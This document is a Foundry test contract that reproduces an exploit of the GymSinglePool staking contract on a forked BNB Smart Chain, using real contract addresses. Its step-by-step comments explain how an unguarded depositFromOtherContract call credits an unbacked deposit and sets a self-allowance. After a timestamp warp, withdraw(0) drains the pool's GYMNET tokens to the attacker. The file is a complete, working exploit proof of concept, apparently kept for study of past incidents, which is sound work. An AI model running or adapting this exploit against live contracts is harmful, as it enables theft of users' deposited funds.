// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));
    GymToken gymnet = GymToken(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);
    GymSinglePool gympool = GymSinglePool(0xA8987285E100A8b557F06A7889F79E0064b359f2);

    function setUp() public {
        cheat.createSelectFork("http://127.0.0.1:8546", 18_501_049); //fork bsc at block 18501049
    }

    function testExploit() public {
        // @VULNERABILITY: Unauthorized deposit crediting via depositFromOtherContract + self-approval without incoming token transfer. See detailed annotation in sources/GymSinglePool_0288FB/contracts_GymSinglePool.sol near depositFromOtherContract and _autoDeposit.
        // @EXPLOIT_STEP 1: Call depositFromOtherContract(largeAmount=8e24+666, periodId=0, isUnlocked=true, _from=attacker). This is callable by anyone (no access control beyond isPoolActive). Inside, _autoDeposit credits userInfo[_from] and pushes UserDeposits WITHOUT ever calling safeTransferFrom to pull tokens from _from or caller. Critically, it does `token.approve(address(this), _depositAmount)` which (since msg.sender inside approve is the pool) sets GymToken.allowance[pool, pool] = amount. This self-allowance on the pool's own GYMNET balance is the enabler for later drain. (See _autoDeposit L393 in source.)
        gympool.depositFromOtherContract(8_000_000_000_000_000_000_000_666, 0, true, address(this));

        // @EXPLOIT_STEP 2: Warp timestamp forward to 1654683789 to satisfy the withdrawal lock check `block.timestamp > withdrawalTimestamp` in _withdraw (the isUnlocked path sets a short lock via addSeconds, but the fork block time may be before it; warp bypasses regardless). Note: in migration mode this check is also skippable via isInMigrationToVTwo, but here we use warp to match original PoC.
        cheat.warp(1_654_683_789);

        // @EXPLOIT_STEP 3: Call withdraw(0) which hits _withdraw. It subtracts the (unbacked) deposit accounting, then does `token.safeTransferFrom(address(this), msg.sender=attacker, depositTokens)`. Because of the prior self-approve, the pool (as spender) has allowance from itself, so this pulls real GYMNET from the pool's reserves directly to attacker. Attacker never sent any tokens. The pool's GYMNET is now drained for this fake stake.
        gympool.withdraw(0);
        emit log_named_uint("Exploit completed, GYMNET balance of attacker:", gymnet.balanceOf(address(this)));
    }
}
